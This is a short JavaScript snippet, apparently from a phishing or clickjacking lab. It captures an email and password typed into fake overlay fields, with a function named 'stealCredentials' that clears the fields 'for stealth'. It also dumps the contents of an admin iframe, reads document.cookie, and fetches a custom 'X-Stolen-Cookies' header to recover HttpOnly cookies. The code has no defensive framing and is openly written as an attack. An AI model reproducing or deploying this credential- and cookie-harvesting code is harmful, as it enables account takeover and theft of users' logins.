function inspectIframe() {
    const iframe = document.getElementById('admin-iframe');
    try {
        const iframeDoc = iframe.contentWindow.document;
        console.log('Iframe Title:', iframeDoc.title);
        console.log('Iframe Body:', iframeDoc.body.innerHTML);
    } catch (e) {
        console.error('Cannot access iframe contents:', e);
    }
}

// Run after iframe loads
document.getElementById('admin-iframe').addEventListener('load', inspectIframe);



// Function to steal credentials from the overlay
function stealCredentials() {
    const email = document.getElementById('fake-email').value;
    const password = document.getElementById('fake-password').value;
    
    console.log('Captured Credentials:');
    console.log('Email:', email);
    console.log('Password:', password);
    
    // Don’t alert for stealth, just log
    document.getElementById('fake-email').value = '';
    document.getElementById('fake-password').value = '';
}

// Check document.cookie (will fail for HttpOnly)
const cookies = document.cookie;
if (cookies) {
    console.log('Cookies via document.cookie:', cookies);
} else {
    console.log('No cookies via document.cookie - HttpOnly blocked!');
}

// Fetch the initial response headers to get X-Stolen-Cookies
fetch('/', { method: 'HEAD' }) // HEAD to avoid reloading the page
    .then(response => {
        const stolenCookies = response.headers.get('X-Stolen-Cookies');
        if (stolenCookies) {
            console.log('Stolen HttpOnly Cookies from X-Stolen-Cookies:', stolenCookies);
        } else {
            console.log('No X-Stolen-Cookies header found.');
        }
    })
    .catch(error => console.error('Fetch failed:', error));


